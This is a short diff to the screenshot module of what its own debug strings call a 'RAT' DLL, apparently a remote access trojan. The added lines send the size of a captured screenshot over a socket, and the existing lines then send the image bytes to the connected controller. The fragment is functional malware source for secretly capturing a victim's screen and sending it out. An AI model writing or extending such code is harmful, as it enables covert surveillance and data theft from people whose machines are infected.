@@ -202,6 +202,16 @@ INT performScreenshot(SOCKET clientSock)
 		goto cleanup;
 	}
 
+	// Send the size of the file so we know when to stop receiving... 
+	status = send(clientSock, (const char*) &dwBufferSize, sizeof(DWORD), 0);
+	if (status == SOCKET_ERROR)
+	{
+		sprintf_s(msgBuf, "RAT-Dll-Screenshot::performScreenshot - Failure recevied from send (file size) %d\n", WSAGetLastError());
+		OutputDebugStringA(msgBuf);
+		status = WSAGetLastError();
+		goto cleanup;
+	}
+
 	status = send(clientSock, *fileBytes, dwBufferSize, 0);
 	if (status == SOCKET_ERROR)
 	{
